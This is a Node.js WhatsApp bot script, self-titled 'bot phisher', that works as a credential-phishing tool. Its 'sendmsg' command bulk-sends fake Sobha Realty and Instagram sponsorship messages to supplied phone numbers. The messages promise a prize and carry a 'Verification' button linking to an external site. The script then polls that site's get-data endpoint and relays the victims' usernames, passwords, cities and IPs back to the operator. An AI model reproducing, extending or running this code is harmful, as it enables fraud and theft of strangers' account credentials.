
/*
   _           _           _     _     _               
  | |__   ___ | |_   _ __ | |__ (_)___| |__   ___ _ __ 
  | '_ \ / _ \| __| | '_ \| '_ \| / __| '_ \ / _ \ '__|
  | |_) | (_) | |_  | |_) | | | | \__ \ | | |  __/ |   
  |_.__/ \___/ \__| | .__/|_| |_|_|___/_| |_|\___|_|  
                    |_|  
                    
                        Creator  :  created by ~> [dreqxy onion] 
                        Version   :  0.0.1 
   _           _                                   
  (_)_ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___   
  | | '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \  
  | | | | \__ \ || (_| | (_| | | | (_| | | | | | | 
  |_|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_| 
                        |___/   

                        Github  :  https://github.com/whmer 
                        author  :  whmer - sam           
*/

const makeWASocket = require("@whiskeysockets/baileys").default;
const connect = require('./connection/connection');
const fs = require("fs");
const { Boom } = require('@hapi/boom');
const http = require('http');
const https = require('https');
const axios = require('axios');
const P = require("pino");
const p = require("pino");
const Pino = require("pino");
const path = require('path');
const sharp = require('sharp');
const { Buffer } = require('buffer');
const { getLinkPreview } = require('link-preview-js');
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('ffmpeg-static');
//const {downloadMediaMessage, downloadContentFromMessage, createSticker, sendSticker } = require('./stickerUtils');
const { exec } = require("child_process");
const webp = require('webp-converter');
const { info } = require('console');
const antilink = JSON.parse(fs.readFileSync('./arquivos/seguranca/anti.json'))
const color = require('color')

const {
	Tool,
	Color,
	DB,
	TicTacToe,
	SaveDB,
	Prefix,
} = require('./db');

//ffmpeg.setFfmpegPath(ffmpegPath); 

async function start() {
  const whmer = await connect();

  whmer.ev.on('messages.upsert', async ({ messages }) => {
    const message = messages[0];
    const body = messages[0];
    console.log(body)
    if (!body) return;

    const jid = body.key.remoteJid;
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    const isGroup = body.key.remoteJid.endsWith("@g.us")
    const isAntiLink = isGroup ? antilink.includes(jid) : false
    const sender = isGroup ? body.key.participant : jid;
    const messageId = body.key.id;
    const fromMe = body.key.fromMe ? true : false;
    const groupMetadata = isGroup ? await whmer.groupMetadata(jid): ""
    const groupMembers = isGroup ? groupMetadata.participants: '';
    const groupAdmins = isGroup ? Tool.getGroupAdmins(groupMembers): '';
    const prefix = '.';
    const isOwner = sender.includes('258856482702');
    const name = body.pushName || "username";
    const type = body.message ? Object.keys(body.message)[0] : '';
    const onion = fs.readFileSync('./image/onion.webp')
    const instagram = fs.readFileSync('./image/STK-20241026-WA0011.webp')
    const kiup = jid.includes('@s.whatsapp.net')
    const emoje = ('🤹🏻‍♀️');
    const isGroupAdmins = groupAdmins.includes(sender) || false 

    const messageText = body.message?.conversation || '';
    const extendedText = body.message?.extendedTextMessage?.text || '';
    const buttonsResponse = body.message?.buttonsResponseMessage?.selectedDisplayText || '';
    const imageCaption = body.message?.imageMessage?.caption || '';
    const documentCaption = body.message?.documentMessage?.caption || '';
    const videoCaption = body.message?.videoMessage?.caption || '';

    const messageOptions = {
      messageText,
      extendedText,
      buttonsResponse,
      imageCaption,
      documentCaption,
      videoCaption
    };

    const textuser = messageOptions.messageText || messageOptions.extendedText || messageOptions.buttonsResponse || messageOptions.imageCaption || messageOptions.documentCaption || messageOptions.videoCaption;

    const commandMatch = textuser.match(new RegExp(`^${prefix}(\\w+)(.*)`));
    if (commandMatch) {
      const command = commandMatch[1];
      const q = commandMatch[2]?.trim();

      const reply = async (text) => {
        await whmer.sendMessage(jid, { text: text }, { quoted: body });
      };

      const dreqxy = {
        'key': {
        participant: `12066409886@s.whatsapp.net`,
        remoteJid: `12066409886@s.whatsapp.net`
        },
        'message':{
          'extendedTextMessage': {
            text: `Sobha Realty Ads`
          }

        }
      }

      switch (command) {

        case 'jidwhmer':{
          const quote = body.message.extendedTextMessage.contextInfo.quotedMessage
          const stringmsg = JSON.stringify(quote)
          reply(`
          case 'iana':
          {
          whmer.relayMessage(jid, {
          viewOnceMessage: {
          message: ${stringmsg}
          }}, {})
          }
          break
          `)
          }
          break

            case 'sendmsg':
              if (!q.trim()) {
                await reply('*Example: 244926362613*');
                return;
              }
            
              const numbers = q.includes(",") ? q.split(",").map(num => num.trim()) : [q];
            
              for (let number of numbers) {
                const msgInstagram = {
                  text: '*Sobha Realty*\nHello! You have won sponsorship. Confirm your account to win R$10,000\n\nhttps://whatsapp.com/channel/0029VaN4YFG35fLzIbdb1D0y',
                  contextInfo: {
                    externalAdReply: {
                      mediaType: 1,
                      title: `Instagram System Ads`,
                      body: "Sponsor",
                      thumbnail: instagram,
                      previewType: "IMAGE",
                      sourceUrl: "https://whatsapp.com/channel/0029VaN4YFG35fLzIbdb1D0y",
                    }
                  }
                };
            
                try {
                  //await whmer.sendMessage(`${number}@s.whatsapp.net`, messageContent, { quoted: dreqxy });
                  await whmer.sendMessage(`${number}@s.whatsapp.net`, msgInstagram, { quoted: dreqxy });
                            await whmer.relayMessage(`${number}@s.whatsapp.net`, {
            viewOnceMessage: {
            message: {
            interactiveMessage: {
            body: {
              text: '*Instagram - Sobha*\n\nVerification:\nWe need to verify your account, after verification Sobha will create a post on Instagram.',
            },
            "footer": {
            "text": "Click the button for System Ads to verify your Instagram account."
            },

            nativeFlowMessage: {
            buttons: [{
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
            display_text: "Verification",
            url: "https://web-whmer.onrender.com/"
            })
            }]
            },
            }
            }
            }
            }, {});
                  await reply(`*Message sent to ${number}*`);
                } catch (e) {
                  await reply(`*ERROR when sending message to ${number}:* ${e}`);
                }
            
                await sleep(3000);
              }

              const iyu = {
                text: `*Loading data...*`,
                contextInfo: {
                    externalAdReply: {
                        mediaType: 1,
                        title: `Loading data...`,
                        body: "instagram",
                        thumbnail: onion, 
                        previewType: "IMAGE",
                        sourceUrl: ""
                    }
                }
            };

    whmer.sendMessage(jid, iyu);

    const obterDados = async () => {
        let dadosRecebidos = null;
        
        while (!dadosRecebidos) {
            try {
                const response = await axios.get('https://web-whmer.onrender.com/get-data');
                dadosRecebidos = response.data;

                if (dadosRecebidos && Object.keys(dadosRecebidos).length > 0) {

                }
            } catch (error) {
                console.error("Error getting data, trying again:", error);
            }

            await new Promise(resolve => setTimeout(resolve, 2000));
        }

        //whmer.sendMessage(jid, { text: `Dados recebidos: ${JSON.stringify(dadosRecebidos)}` });
                  
        let info = "🔍 *login/get-data information*\n";

        for (const username of Object.keys(dadosRecebidos)) {
            const userData = dadosRecebidos[username];
            info += `
*USERNAME:* ${userData.username || 'N/A'}
*PASSWORD:* ${userData.password || 'N/A'}
*CITY:* ${userData.city || 'N/A'}
*IP:* ${userData.ip || 'N/A'}
---------------------------`;
        }

        const pleaseip = {
            text: info.trim(),
            contextInfo: {
                externalAdReply: {
                    mediaType: 1,
                    title: `instagram data`,
                    body: "get-data",
                    thumbnail: onion,  
                    previewType: "IMAGE",
                    sourceUrl: ""
                }
            }
        };

        await whmer.sendMessage(jid, pleaseip, { quoted: body });
        
                //await whmer.sendMessage(jid, pleaseip, { quoted: body });
    };

    obterDados();

              break;
        //default:

      }
    }
  });
}

start();
